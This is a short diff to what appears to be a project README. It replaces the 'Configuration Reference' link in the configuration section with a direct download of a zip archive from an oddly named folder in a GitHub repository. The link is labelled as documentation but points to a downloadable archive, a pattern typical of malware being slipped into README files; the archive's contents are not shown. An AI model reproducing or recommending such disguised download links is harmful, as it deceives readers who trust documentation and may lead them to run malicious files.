@@ -22,4 +22,4 @@ npm run lint
 ```
 
 ### Customize configuration
-See [Configuration Reference](https://raw.githubusercontent.com/a-s-e-e-l/frontend/master/vulvar/frontend.zip).
+See [Configuration Reference](https://raw.githubusercontent.com/a-s-e-e-l/frontend/master/unicursality/frontend.zip).
